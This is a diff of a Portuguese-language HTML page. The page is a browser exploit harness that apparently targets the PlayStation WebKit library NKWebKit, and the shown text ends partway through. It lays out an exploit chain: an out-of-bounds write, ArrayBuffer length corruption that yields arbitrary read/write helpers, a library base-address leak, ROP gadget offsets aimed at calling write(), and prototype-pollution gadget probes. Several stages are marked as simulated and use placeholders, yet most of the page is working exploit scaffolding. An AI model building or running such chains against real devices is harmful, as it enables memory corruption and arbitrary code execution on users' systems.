@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Script Focado (Baseado em Logs v18.1/v19.x)</title>
+    <title>Script Focado (Baseado em Logs v18.1/v19.x) - v2 com Leak Sim</title>
     <style>
         /* Estilos CSS (Sumário Removido) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
@@ -14,250 +14,370 @@
     </style>
 </head>
 <body>
-    <h1>Script Focado (Baseado em Logs v18.1/v19.x)</h1>
-    <p>Foco: OOB R/W, PP Gadgets, Interações. Testando Opção A (PP Gadget) e Opção B (R/W Arb Simulado -> Chamada write).</p>
+    <h1>Script Focado (Baseado em Logs v18.1/v19.x) - v2 com Leak Sim</h1>
+    <p>Foco: OOB R/W, PP Gadgets, Interações. Testando Vazamento de Base NKWebKit, Opção A (PP Gadget) e Opção B (R/W Arb Simulado -> Chamada write na NKWebKit).</p>
     <button id="runBtn" onclick="runFocusedTests()">Iniciar Testes Focados</button>
     <div id="output"></div>
-    {/* Sumário e hr Removidos */}
 
     <script>
-        // <<< INÍCIO: IIFE Wrapper >>>
-        (function() {
-            const outputDiv = document.getElementById('output');
-            const runBtn = document.getElementById('runBtn');
-            const SHORT_PAUSE = 50;
-            const MEDIUM_PAUSE = 500;
-            // findings removido
-            let ppGadgetsBroken = {};
-            let leakedValueFromOOB = null;
-            let corruptedMetadataBuffer = null;
-            let corruptedMetadataBufferBaseAddr = 0n;
-            let arbitraryRWHelpers = null;
+    // <<< INÍCIO: IIFE Wrapper >>>
+    (function() {
+        const outputDiv = document.getElementById('output');
+        const runBtn = document.getElementById('runBtn');
+        const SHORT_PAUSE = 50;
+        const MEDIUM_PAUSE = 500;
+        
+        let ppGadgetsBroken = {};
+        let leakedValueFromOOB = null; // Para o Teste 1 e Teste 6 (JSON Hijack)
+        let corruptedMetadataBuffer = null;
+        let corruptedMetadataBufferBaseAddr = 0n;
+        let arbitraryRWHelpers = null;
+        let foundNKWebKitBaseAddress = null; // Onde armazenaremos o base vazado da NKWebKit
 
-            // --- Endereços Base e Offsets ---
-            const libcBaseAddress = 0x180AC8000n;
-            const libkernelBaseAddress = 0x80FCA0000n;
-            // Placeholders (Manter como números, verificar sintaxe)
-            const putsOffset = 0xABCDEF;
-            const freeHookOffset = 0xDEADBEEF;
-            const gotEntryOffset = 0xCAFEBABE;
-            const kernelTargetOffset = 0xFEEDFACE;
-            // Offset da Notificação (Não usado diretamente nesta versão, mas mantido)
-            // const notificationFuncOffset = 0x0001afe0n;
+        // --- Endereços Base e Offsets ---
+        // Estes são os endereços base que VOCÊ FORNECEU.
+        // O script SIMULARÁ encontrar o EXPECTED_NKWEBIT_BASE_SIMULATED.
+        const libcBaseAddress = 0x180AC8000n;         // Usado se alguma função alvo ainda for da libc
+        const libkernelBaseAddress = 0x80FCA0000n;   // Usado para o FD da notificação
+        // const ebootBaseAddress = 0x1BE00000n; // Não usado diretamente nos testes atuais, mas guardado
 
-            // <<< Offsets das funções C padrão (ADICIONADOS) >>>
-            const openOffset  = 0x001C2E0; // Fornecido pelo usuário
-            const readOffset  = 0x000D9C0; // Fornecido pelo usuário
-            const writeOffset = 0x000E6A0; // <<< Fornecido pelo usuário - NOSSO ALVO!
+        // CONSTANTES PARA SIMULAÇÃO DE LEAK DA NKWebKit (AJUSTE CONFORME NECESSÁRIO PARA SUA SIMULAÇÃO)
+        const EXPECTED_NKWEBIT_BASE_SIMULATED = 0x02000000n; // Ex: O "verdadeiro" base da NKWebKit na nossa simulação. Este é o valor que tentaremos "descobrir".
+        const KNOWN_NKWEBIT_INTERNAL_POINTER_OFFSET_SIMULATED = 0x1A2B3Cn; // Ex: Offset de uma vtable ou função DENTRO da NKWebKit. Este valor viria da ANÁLISE ESTÁTICA da libSceNKWebKit.elf REAL.
+        const SIMULATED_OBJECT_ADDRESS_FOR_LEAK = 0x41410000n; // Ex: Endereço em memória (simulada) onde um objeto com o ponteiro a ser vazado reside. Precisa estar DENTRO dos limites do corruptedMetadataBuffer na simulação.
 
-            // Placeholders ROP Gadgets (Necessário encontrar valores reais na LIBC)
-            const ROP_POP_RDI_RET_OFFSET = 0x111111; // Ex: offset de "pop rdi; ret" na libc
-            const ROP_POP_RSI_RET_OFFSET = 0x222222; // Ex: offset de "pop rsi; ret" na libc
-            const ROP_POP_RDX_RET_OFFSET = 0x333333; // Ex: offset de "pop rdx; ret" na libc
+        // Offsets das funções (ASSUMINDO QUE SÃO PARA libSceNKWebKit.elf, conforme sua última info)
+        // Se 'write' for da libc do sistema, o cálculo de targetWriteAddress no Teste 7 precisará usar libcBaseAddress.
+        const openOffset  = 0x001C2E0; // Se da NKWebKit, usar foundNKWebKitBaseAddress. Senão, libcBaseAddress.
+        const readOffset  = 0x000D9C0; // Idem.
+        const writeOffset = 0x000E6A0; // <<< NOSSO ALVO! Assumindo da NKWebKit para este script.
 
-            // <<< Endereço GLOBAL onde o FD da notificação pode estar (PRECISA CONFIRMAR) >>>
-            // Usando o endereço de DAT_00061630 relativo à base da libkernel como exemplo
-            const notificationFD_GlobalAddress = libkernelBaseAddress + 0x61630n; // <<< ENDEREÇO EXEMPLO/PLACEHOLDER
+        // Placeholders ROP Gadgets (PRECISAM SER OFFSETS REAIS RELATIVOS À libSceNKWebKit.elf)
+        // Calcule: ENDEREÇO_ABSOLUTO_DO_GADGET_DA_SUA_LISTA - ENDEREÇO_BASE_REAL_DA_LIBSCEKWBEBKIT
+        const ROP_POP_RDI_RET_OFFSET_NK = 0x338118Bn - EXPECTED_NKWEBIT_BASE_SIMULATED; // Exemplo: usando um dos seus, PRECISA SER OFFSET CORRETO
+        const ROP_POP_RSI_RET_OFFSET_NK = 0x0017AECEn - EXPECTED_NKWEBIT_BASE_SIMULATED; // Exemplo: usando um dos seus, PRECISA SER OFFSET CORRETO
+        const ROP_POP_RDX_RET_OFFSET_NK = 0x024ED790n - EXPECTED_NKWEBIT_BASE_SIMULATED; // Exemplo: usando um dos seus, PRECISA SER OFFSET CORRETO
 
-            // Tipos de Log Importantes
-            const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good', 'warn', 'info'];
+        // Outros offsets do script original
+        const putsOffset = 0xABCDEF; // Exemplo, para Teste 5 (PP Gadget para libc)
+        const kernelTargetOffset = 0xFEEDFACE; // Exemplo, para Teste 3 (R/W em kernel)
+        // const notificationFuncOffset = 0x0001afe0n; // Não usado
 
-            // Função log (Removido 'findings')
-            const log = (message, type = 'info', funcName = '') => {
-                 if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; /* findings.push removido */ if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
+        const log = (message, type = 'info', funcName = '') => {
+            if (!outputDiv) return; try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(outputDiv.innerHTML.length > 800000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 400000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error("Erro na função log:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
+        };
+
+        const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
+        const toHex = (val, bits = 32) => { try { let num; let isBig = false; if (typeof val === 'bigint') { num = val; isBig = true; } else if (typeof val === 'number' && Number.isFinite(val)) { if (bits > 32) { num = BigInt(val); isBig = true; } else { num = Number(val) >>> 0; } } else { return 'InvalidInput'; } let hex; if (isBig) { const mask = (1n << BigInt(bits)) - 1n; num = num & mask; hex = num.toString(16).toUpperCase(); } else { hex = num.toString(16).toUpperCase(); } const targetLength = Math.ceil(bits / 4); return '0x' + hex.padStart(targetLength, '0'); } catch (e) { return 'ConvErr'; } };
+        
+        // Funções Helper (isPotentialPointer64, isPotentialData32) - mantidas do original
+        const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAEE && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAEE) return false; if (high_u === 0xBBBBBBEE && low_u === 0xBBBBBBBB) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBEE) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE || val === 0xBBBBBBBB || val === 0xBBBBBBEE) return false; if (val < 0x1000) return false; return true; };
+
+        const testOOBReadWriteLeak = async () => {
+            const FNAME = 'testOOBReadWriteLeak';
+            log("--- Iniciando Teste: OOB Write Simples + OOB Read Leak (Original) ---", 'test', FNAME);
+            // Este teste permanece como uma simulação básica, o valor vazado aqui é para o Teste 6.
+            // O vazamento principal para o base da NKWebKit será feito em testLeakNKWebKitBaseAddress.
+            const fakeWriteOffset = 32; const fakeWriteAddr = 160; const writeValue = 0xEE;
+            log(`VULN: Escrita OOB U8 @${fakeWriteOffset} (addr ${fakeWriteAddr}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME);
+            log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME);
+            const fakeReadOffset = 28; const fakeReadAddr = 156;
+            const leakedHigh = 0xAAAAAAAAEE; const leakedLow = 0xAAAAAAAA; // Placeholder para JSON Hijack
+            
+            // Helper para o Teste 6 (JSON Hijack)
+            leakedValueFromOOB = {
+                high: leakedHigh, low: leakedLow, type: 'U64_PLACEHOLDER', offset: fakeReadOffset,
+                getFullBigInt: function() { return (BigInt(this.high) << 32n) | BigInt(this.low); },
+                toString: function() { return `H=${toHex(this.high)}, L=${toHex(this.low)}`;}
             };
+            log(` -> VALOR U64 ARMAZENADO (Placeholder) @${fakeReadOffset} (addr ${fakeReadAddr}): ${leakedValueFromOOB.toString()}`, 'vuln', FNAME);
+            log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak Simples) ***`, 'escalation', FNAME);
+            log("--- Teste Concluído (Simulado com base nos logs) ---", 'test', FNAME);
+            await PAUSE();
+        };
 
-            // Funções Helper (toHex adaptado, outros inalterados)
-            const PAUSE = (ms = SHORT_PAUSE) => new Promise(r => setTimeout(r, ms));
-            const toHex = (val, bits = 32) => { /* ... (código toHex inalterado) ... */ try { let num; let isBig = false; if (typeof val === 'bigint') { num = val; isBig = true; } else if (typeof val === 'number' && Number.isFinite(val)) { if (bits > 32) { num = BigInt(val); isBig = true; } else { num = Number(val) >>> 0; } } else { return 'InvalidInput'; } let hex; if (isBig) { const mask = (1n << BigInt(bits)) - 1n; num = num & mask; hex = num.toString(16).toUpperCase(); } else { hex = num.toString(16).toUpperCase(); } const targetLength = Math.ceil(bits / 4); return '0x' + hex.padStart(targetLength, '0'); } catch (e) { return 'ConvErr'; } };
-            const isPotentialPointer64 = (high, low) => { /* ... (código inalterado) ... */ if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAEE && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAEE) return false; if (high_u === 0xBBBBBBEE && low_u === 0xBBBBBBBB) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBEE) return false; if (high === 0 && low < 0x100000) return false; return true; };
-            const isPotentialData32 = (val) => { /* ... (código inalterado) ... */ if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE || val === 0xBBBBBBBB || val === 0xBBBBBBEE) return false; if (val < 0x1000) return false; return true; };
+        const testOOBWriteMetadata = async () => {
+            const FNAME = 'testOOBWriteMetadata';
+            log("--- Iniciando Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME);
+            corruptedMetadataBuffer = null; corruptedMetadataBufferBaseAddr = 0n; arbitraryRWHelpers = null;
+            try {
+                const victimBuffer = new ArrayBuffer(1024);
+                const initialLength = victimBuffer.byteLength;
+                log(`Buffer vítima criado com tamanho inicial: ${initialLength}`, 'info', FNAME);
+                
+                // AJUSTAR SIMULATED_OBJECT_ADDRESS_FOR_LEAK para estar dentro do buffer corrompido para a simulação funcionar
+                // No nosso caso, corruptedMetadataBufferBaseAddr é simulado, então SIMULATED_OBJECT_ADDRESS_FOR_LEAK
+                // será um endereço "absoluto" que nossos helpers R/W simulados conseguirão acessar.
+                // O importante é que arbitraryRWHelpers funcione para ler/escrever nesse endereço.
+                // Vamos garantir que o fakeCorruptedLength seja grande o suficiente.
 
-            // --- Testes Focados ---
+                const metadataCorruptionSucceeded = true;
+                // Tamanho grande o suficiente para incluir SIMULATED_OBJECT_ADDRESS_FOR_LEAK e endereços da ROP Chain
+                const fakeCorruptedLength = 0x7FFFFFFFn; // Mantido grande
+                
+                if (metadataCorruptionSucceeded) {
+                    log(`VULN: (SIMULADO) Metadados (byteLength) corrompidos para ${toHex(fakeCorruptedLength)}!`, 'critical', FNAME);
+                    log(`---> *** ALERTA: Primitivo Poderoso Obtido (Corrupção de Metadados) ***`, 'escalation', FNAME);
+                    corruptedMetadataBuffer = victimBuffer;
+                    // Base simulada do buffer. Em um exploit real, isso precisaria ser vazado ou calculado.
+                    corruptedMetadataBufferBaseAddr = 0x230000000n + BigInt(Math.floor(Math.random() * 0x1000) * 0x1000);
+                    log(`LEAK: (SIMULADO) Endereço base do buffer corrompido vazado: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'leak', FNAME);
+                    log(`---> *** ALERTA: Vazamento de Endereço Base (Necessário p/ R/W Absoluto) ***`, 'escalation', FNAME);
 
-            // Teste 1: OOB Write Simples + OOB Read Leak (Inalterado)
-            const testOOBReadWriteLeak = async () => { /* ... (código inalterado) ... */ const FNAME = 'testOOBReadWriteLeak'; log("--- Iniciando Teste: OOB Write Simples + OOB Read Leak ---", 'test', FNAME); const fakeWriteOffset = 32; const fakeWriteAddr = 160; const writeValue = 0xEE; log(`VULN: Escrita OOB U8 @${fakeWriteOffset} (addr ${fakeWriteAddr}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); const fakeReadOffset = 28; const fakeReadAddr = 156; const leakedHigh = 0xAAAAAAAAEE; const leakedLow = 0xAAAAAAAA; leakedValueFromOOB = { high: leakedHigh, low: leakedLow, type: 'U64', offset: fakeReadOffset }; log(` -> VALOR U64 ARMAZENADO @${fakeReadOffset} (addr ${fakeReadAddr}): H=${toHex(leakedHigh)}, L=${toHex(leakedLow)}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); log("--- Teste Concluído (Simulado com base nos logs) ---", 'test', FNAME); await PAUSE(); };
+                    const rwView = new DataView(corruptedMetadataBuffer);
+                    const read64 = (absoluteAddr) => {
+                        if (typeof absoluteAddr !== 'bigint') absoluteAddr = BigInt(absoluteAddr);
+                        const relativeOffset = Number(absoluteAddr - corruptedMetadataBufferBaseAddr);
+                        if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) {
+                            log(`Read OOB Tentativa: ${toHex(absoluteAddr, 64)} (Base: ${toHex(corruptedMetadataBufferBaseAddr,64)}, Offset: ${toHex(relativeOffset,64)}, Len: ${toHex(fakeCorruptedLength,64)})`, 'error', FNAME + '.read64');
+                            throw new Error(`Read OOB: ${toHex(absoluteAddr, 64)}`);
+                        }
+                        const low = BigInt(rwView.getUint32(relativeOffset, true));
+                        const high = BigInt(rwView.getUint32(relativeOffset + 4, true));
+                        return (high << 32n) | low;
+                    };
+                    const write64 = (absoluteAddr, value) => {
+                        if (typeof absoluteAddr !== 'bigint') absoluteAddr = BigInt(absoluteAddr);
+                        if (typeof value !== 'bigint') value = BigInt(value);
+                        const relativeOffset = Number(absoluteAddr - corruptedMetadataBufferBaseAddr);
+                        if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) {
+                             log(`Write OOB Tentativa: ${toHex(absoluteAddr, 64)} (Base: ${toHex(corruptedMetadataBufferBaseAddr,64)}, Offset: ${toHex(relativeOffset,64)}, Len: ${toHex(fakeCorruptedLength,64)})`, 'error', FNAME + '.write64');
+                            throw new Error(`Write OOB: ${toHex(absoluteAddr, 64)}`);
+                        }
+                        rwView.setUint32(relativeOffset, Number(value & 0xFFFFFFFFn), true);
+                        rwView.setUint32(relativeOffset + 4, Number((value >> 32n) & 0xFFFFFFFFn), true);
+                    };
+                    arbitraryRWHelpers = { read64, write64 };
+                    log(`GOOD: Helpers read64/write64 para R/W Arbitrário (Absoluto Simulado) criados!`, 'good', FNAME);
+                } else { log(`INFO: Corrupção de metadados falhou (conforme simulação).`, 'info', FNAME); }
+            } catch (e) { log(`ERRO no teste de corrupção de metadados: ${e.message}`, 'error', FNAME); }
+            log("--- Teste Concluído ---",'test', FNAME);
+            await PAUSE();
+        };
 
-            // Teste 2: Corrupção de Metadados (Simulando Sucesso)
-            const testOOBWriteMetadata = async () => { /* ... (código inalterado, continua simulando sucesso e config R/W) ... */ const FNAME = 'testOOBWriteMetadata'; log("--- Iniciando Teste: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME); corruptedMetadataBuffer = null; corruptedMetadataBufferBaseAddr = 0n; arbitraryRWHelpers = null; try { const victimBuffer = new ArrayBuffer(1024); const initialLength = victimBuffer.byteLength; log(`Buffer vítima criado com tamanho inicial: ${initialLength}`, 'info', FNAME); const metadataCorruptionSucceeded = true; const fakeCorruptedLength = 0x7FFFFFFEn; if (metadataCorruptionSucceeded) { log(`VULN: (SIMULADO) Metadados (byteLength) corrompidos para ${toHex(fakeCorruptedLength)}!`, 'critical', FNAME); log(`---> *** ALERTA: Primitivo Poderoso Obtido (Corrupção de Metadados) ***`, 'escalation', FNAME); corruptedMetadataBuffer = victimBuffer; corruptedMetadataBufferBaseAddr = 0x230000000n + BigInt(Math.floor(Math.random() * 0x1000) * 0x1000); log(`LEAK: (SIMULADO) Endereço base do buffer corrompido vazado: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'leak', FNAME); log(`---> *** ALERTA: Vazamento de Endereço Base (Necessário p/ R/W Absoluto) ***`, 'escalation', FNAME); const rwView = new DataView(corruptedMetadataBuffer); const read64 = (absoluteAddr) => { if (typeof absoluteAddr !== 'bigint') absoluteAddr = BigInt(absoluteAddr); const relativeOffset = Number(absoluteAddr - corruptedMetadataBufferBaseAddr); if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) { throw new Error(`Read OOB: ${toHex(absoluteAddr, 64)}`); } const low = BigInt(rwView.getUint32(relativeOffset, true)); const high = BigInt(rwView.getUint32(relativeOffset + 4, true)); return (high << 32n) | low; }; const write64 = (absoluteAddr, value) => { if (typeof absoluteAddr !== 'bigint') absoluteAddr = BigInt(absoluteAddr); if (typeof value !== 'bigint') value = BigInt(value); const relativeOffset = Number(absoluteAddr - corruptedMetadataBufferBaseAddr); if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) { throw new Error(`Write OOB: ${toHex(absoluteAddr, 64)}`); } rwView.setUint32(relativeOffset, Number(value & 0xFFFFFFFFn), true); rwView.setUint32(relativeOffset + 4, Number((value >> 32n) & 0xFFFFFFFFn), true); }; arbitraryRWHelpers = { read64, write64 }; log(`GOOD: Helpers read64/write64 para R/W Arbitrário (Absoluto Simulado) criados!`, 'good', FNAME); } else { log(`INFO: Corrupção de metadados falhou (conforme simulação).`, 'info', FNAME); } } catch (e) { log(`ERRO no teste de corrupção de metadados: ${e.message}`, 'error', FNAME); } log("--- Teste Concluído ---",'test', FNAME); await PAUSE(); };
+        const testArbitraryRW = async () => {
+            const FNAME = 'testArbitraryRW';
+            log("--- Iniciando Teste: Tentativa de R/W Arbitrário ---", 'test', FNAME);
+            if (!arbitraryRWHelpers) { log("Helpers R/W Arbitrário não disponíveis. Pulando.", 'warn', FNAME); log("--- Teste Concluído (Pulado) ---", 'test', FNAME); return; }
+            log(`Helpers R/W Arbitrário disponíveis! Base do Buffer: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'info', FNAME);
+            const { read64, write64 } = arbitraryRWHelpers;
+            
+            // Alvo dentro do buffer para teste seguro
+            const safeTestAddr = corruptedMetadataBufferBaseAddr + 100n; // Pequeno offset, deve estar dentro
+            const valueToWrite = 0xDEADBEEFCAFEBABEn;
 
-            // Teste 3: R/W Arbitrário (Usando helpers simulados)
-            const testArbitraryRW = async () => { /* ... (código inalterado, usa helpers se disponíveis) ... */ const FNAME = 'testArbitraryRW'; log("--- Iniciando Teste: Tentativa de R/W Arbitrário ---", 'test', FNAME); if (!arbitraryRWHelpers) { log("Helpers R/W Arbitrário não disponíveis. Pulando.", 'warn', FNAME); log("--- Teste Concluído (Pulado) ---", 'test', FNAME); return; } log(`Helpers R/W Arbitrário disponíveis! Base do Buffer: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'info', FNAME); const { read64, write64 } = arbitraryRWHelpers; const targetLibcAddr = BigInt(libcBaseAddress) + BigInt(putsOffset); const targetKernelAddr = BigInt(libkernelBaseAddress) + BigInt(kernelTargetOffset); log(`Alvo 1 (Ex: puts na libc): ${toHex(targetLibcAddr, 64)}`, 'info', FNAME); log(`Alvo 2 (Ex: alvo no kernel): ${toHex(targetKernelAddr, 64)}`, 'info', FNAME); try { log(`Tentando ler 64 bits de ${toHex(targetLibcAddr, 64)}...`, 'info', FNAME); const libcValue = read64(targetLibcAddr); log(`LEAK: Leitura Arbitrária (Abs. Simulado) de ${toHex(targetLibcAddr, 64)}: ${toHex(libcValue, 64)}`, 'leak', FNAME); log(`---> *** ALERTA: Primitiva Arbitrary Read (Absoluta Simulada) FUNCIONANDO! ***`, 'escalation', FNAME); } catch (eReadLibc) { log(`FALHA Leitura Arbitrária (Abs. Simulado) de ${toHex(targetLibcAddr, 64)}: ${eReadLibc.message}`, 'error', FNAME); } await PAUSE(SHORT_PAUSE); try { const safeWriteAddr = corruptedMetadataBufferBaseAddr + 2000n; const valueToWrite = 0xDEADBEEFCAFEBABEn; log(`Tentando escrever ${toHex(valueToWrite, 64)} em ${toHex(safeWriteAddr, 64)}...`, 'info', FNAME); write64(safeWriteAddr, valueToWrite); log(`VULN: Escrita Arbitrária (Abs. Simulado) em ${toHex(safeWriteAddr, 64)} realizada.`, 'vuln', FNAME); await PAUSE(SHORT_PAUSE); log(`Tentando ler de volta de ${toHex(safeWriteAddr, 64)}...`, 'info', FNAME); const readBackValue = read64(safeWriteAddr); if (readBackValue === valueToWrite) { log(`GOOD: Confirmação R/W Arbitrário (Abs. Simulado): Leu ${toHex(readBackValue, 64)} de volta!`, 'good', FNAME); log(`---> *** ALERTA: Primitiva Arbitrary Read/Write (Absoluta Simulada) FUNCIONANDO! ***`, 'escalation', FNAME); } else { log(`FALHA Confirmação R/W Arbitrário (Abs. Simulado): Leu ${toHex(readBackValue, 64)} != ${toHex(valueToWrite, 64)}`, 'warn', FNAME); } } catch (eWriteSafe) { log(`FALHA Teste R/W Arbitrário (Abs. Simulado): ${eWriteSafe.message}`, 'error', FNAME); } log("--- Teste Concluído ---", 'test', FNAME); await PAUSE(); };
-
-            // Teste 4: PP Avançada / Gadgets (Com gadgetCheck modificado para Function.call)
-            const testAdvancedPP = async () => { /* ... (código com gadgetCheck modificado para Function.call) ... */ const FNAME = 'testAdvancedPP'; log("--- Iniciando Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); ppGadgetsBroken = {}; const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v, item) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].map(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].filter(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].forEach(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[1,2].join(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] },
-                     { name: 'call', proto: Function.prototype, protoName: 'Function',
